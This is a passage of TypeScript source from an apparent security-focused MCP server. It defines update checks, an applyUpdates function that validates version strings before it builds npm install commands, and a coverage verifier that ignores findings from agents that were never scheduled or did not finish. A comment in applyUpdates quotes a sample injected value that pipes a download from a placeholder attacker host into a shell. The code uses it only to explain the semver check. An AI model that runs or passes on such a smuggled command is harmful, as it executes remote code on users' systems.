/** Fetch the skills manifest and return a list of skills that have a newer version. */
async function fetchSkillUpdates(
  versions: Record<string, { version: string }>
): Promise<UpdateCheckResult["skillUpdates"]> {
  const manifestRaw = await httpsGet(SKILLS_MANIFEST_URL, MAX_MANIFEST_BYTES, 3000);
  if (!manifestRaw) return [];
  try {
    interface SkillEntry { version: string; }
    const manifest = JSON.parse(manifestRaw) as { skills: Record<string, SkillEntry> };
    return Object.entries(manifest.skills).flatMap(([name, entry]) => {
      const current = versions[name]?.version;
      return current && current !== entry.version
        ? [{ skillName: name, currentVersion: current, latestVersion: entry.version }]
        : [];
    });
  } catch { /* ignore parse error */ }
  return [];
}

export async function checkUpdates(args: z.infer<typeof CheckUpdatesSchema>): Promise<UpdateCheckResult> {
  const { currentMcpVersion } = args;

  const versions = readJson<Record<string, { version: string }>>(SKILL_VERSIONS_PATH, {});
  const [latestMcpVersion, skillUpdates] = await Promise.all([
    fetchLatestMcpVersion(),
    fetchSkillUpdates(versions)
  ]);

  const mcpUpgradeAvailable =
    latestMcpVersion !== null && isStrictlyNewer(latestMcpVersion, currentMcpVersion);
  const hasUpdate = mcpUpgradeAvailable || skillUpdates.length > 0;

  const changelogParts: string[] = [];
  if (mcpUpgradeAvailable) {
    changelogParts.push(`security-mcp: ${currentMcpVersion} → ${latestMcpVersion}`);
  }
  if (skillUpdates.length > 0) {
    changelogParts.push(`Skills with updates: ${skillUpdates.map((s) => s.skillName).join(", ")}`);
  }

  return { hasUpdate, currentMcpVersion, latestMcpVersion, skillUpdates, changelog: changelogParts.join("\n") };
}

// 8. apply_updates (returns instructions for the SKILL.md to surface to user)
// ---------------------------------------------------------------------------

export const ApplyUpdatesSchema = z.object({
  choice: z.enum(["auto", "manual"]).describe(
    "auto = agent will run npm install command; manual = return commands for user to run."
  ),
  latestMcpVersion: z.string().optional().describe("Latest version to install (from check_updates)."),
  skillUpdates: z.array(z.object({ skillName: z.string() })).optional()
    .describe("Skills to re-download (from check_updates).")
});

export async function applyUpdates(args: z.infer<typeof ApplyUpdatesSchema>): Promise<{
  commands: string[];
  message: string;
}> {
  const { choice, latestMcpVersion, skillUpdates } = args;
  const commands: string[] = [];

  if (latestMcpVersion) {
    // CWE-20 / TM-004: latestMcpVersion is caller-supplied (not guaranteed to come from
    // fetchLatestMcpVersion which validates against SEMVER_RE). A compromised npm
    // registry response or a direct MCP call could inject shell metacharacters into the
    // command string. Even though applyUpdates only *returns* commands (never execs them),
    // a crafted string like "1.0.0; curl attacker.com|sh" would be surfaced to the user
    // for copy-paste execution. Reject non-semver versions defensively.
    if (!SEMVER_RE.test(latestMcpVersion)) {
      throw new Error(
        `applyUpdates: latestMcpVersion "${latestMcpVersion}" is not a valid semver string. ` +
        `Refusing to generate update commands to prevent command injection.`
      );
    }
    commands.push(`npm install -g security-mcp@${latestMcpVersion}`);
    commands.push(`security-mcp install`);
  }

  if (skillUpdates?.length) {
    // CWE-20: validate skillName before interpolating into command strings
    const safeSkills = skillUpdates.filter((s) => SAFE_SKILL_NAME_RE.test(s.skillName));
    const rejectedCount = skillUpdates.length - safeSkills.length;
    if (rejectedCount > 0) {
      console.warn(`[applyUpdates] Rejected ${rejectedCount} skill(s) with unsafe names.`);
    }
    commands.push(
      `# Re-download updated skills (handled automatically next time /ciso-orchestrator runs)`,
      ...safeSkills.map((s) => `# skill: ${s.skillName} will be refreshed via orchestration.ensure_skill`)
    );
  }

  const message =
    choice === "auto"
      ? `Run the following commands to update:\n${commands.filter((c) => !c.startsWith("#")).join("\n")}`
      : `To update manually, run:\n${commands.join("\n")}`;

  return { commands, message };
}

// 9. verify_skill_coverage
// ---------------------------------------------------------------------------

export const VerifySkillCoverageSchema = z.object({
  agentRunId: z.string().describe("Agent run ID to verify coverage for.")
});

/**
 * Reports which SKILL.md sections a run has evidence for.
 *
 * A file only counts when the manifest names its agent AND that agent reached a terminal
 * completed status. Without both checks this function counted any findings-shaped JSON
 * in the run directory, so a file for an agent that was never scheduled, or one that was
 * scheduled and failed, contributed sections exactly as a completed agent would.
 *
 * `verified` reports whether the run carries an attestation chain. This function does
 * not itself verify attestations, so a caller must not read its output as proof of work
 * when `verified` is false. The gate does not score coverage from here at all: it scores
 * from the files the merge accepted after attestation.
 */
export async function verifySkillCoverage(args: z.infer<typeof VerifySkillCoverageSchema>): Promise<{
  covered: string[];
  uncovered: string[];
  coveragePercent: number;
  status: "PASS" | "WARN";
  verified: boolean;
  ignoredFiles: string[];
}> {
  const dir = agentRunDir(args.agentRunId);
  const sectionsSeen = new Set<string>();
  const ignoredFiles: string[] = [];

  let manifest: AgentRunManifest | null = null;
  try {
    manifest = JSON.parse(await readFile(join(dir, "manifest.json"), "utf-8")) as AgentRunManifest;
  } catch { /* no manifest — nothing can be corroborated */ }

  let files: string[] = [];
  try {
    const entries = await readdir(dir);
    files = findingsCandidates(entries);
  } catch { /* empty */ }

  const TERMINAL_OK = new Set(["completed", "completed_partial"]);

  for (const file of files) {
    try {
      const raw = await readFile(join(dir, file), "utf-8");
      const parsed = JSON.parse(raw) as Partial<AgentFindingsFile>;
      const name = parsed.agentName ?? file.replace(/\.json$/, "");
      const record = manifest?.agents?.[name as AgentName];
      if (!record || !TERMINAL_OK.has(String(record.status))) {
        ignoredFiles.push(file);
        continue;
      }
      for (const s of (parsed.skillMdSectionsCovered ?? [])) sectionsSeen.add(s);
    } catch {
      ignoredFiles.push(file);
    }
  }

  // Score against what this run's roster can actually cover, not the global section
  // list: a repo with no cloud/AI/mobile surface never schedules the personas that own
  // those sections, so a global denominator makes 100% unreachable by construction and
  // fails every honest run. This mirrors the denominator mergeAgentFindings already uses
  // so both paths agree. An unreadable roster falls back to the full list (see
  // coverageDenominatorFor) rather than shrinking into an easier target.
  const roster = Object.keys(manifest?.agents ?? {}) as AgentName[];
  const denominator = roster.length > 0 ? coverageDenominatorFor(roster) : [...SKILL_MD_SECTIONS];

  const covered = denominator.filter((s) => sectionsSeen.has(s));
  const uncovered = denominator.filter((s) => !sectionsSeen.has(s));
  const coveragePercent = Math.round((covered.length / denominator.length) * 100);

  let verified = false;
  try {
    verified = (await verifyChain(args.agentRunId)).valid;
  } catch { /* no chain — verified stays false */ }

  return {
    covered,
    uncovered,
    coveragePercent,
    // The documented floor is minCoveragePct() (90% by default), not perfection.
    // Requiring uncovered.length === 0 held every run to 100% and contradicted both
    // the docstring above and the floor mergeAgentFindings enforces.
    status: coveragePercent >= minCoveragePct() ? "PASS" : "WARN",
    verified,
    ignoredFiles
  };
}

// ---------------------------------------------------------------------------
// Export all schemas for server registration
// ---------------------------------------------------------------------------

export const orchestrationTools = {
  createAgentRun: { schema: CreateAgentRunSchema, fn: createAgentRun },
  updateAgentStatus: { schema: UpdateAgentStatusSchema, fn: updateAgentStatus },
  mergeAgentFindings: { schema: MergeAgentFindingsSchema, fn: mergeAgentFindings },
  ensureSkill: { schema: EnsureSkillSchema, fn: ensureSkill },
  readAgentMemory: { schema: ReadAgentMemorySchema, fn: readAgentMemory },
  writeAgentMemory: { schema: WriteAgentMemorySchema, fn: writeAgentMemory },
  checkUpdates: { schema: CheckUpdatesSchema, fn: checkUpdates },
  applyUpdates: { schema: ApplyUpdatesSchema, fn: applyUpdates },
  verifySkillCoverage: { schema: VerifySkillCoverageSchema, fn: verifySkillCoverage }
} as const;
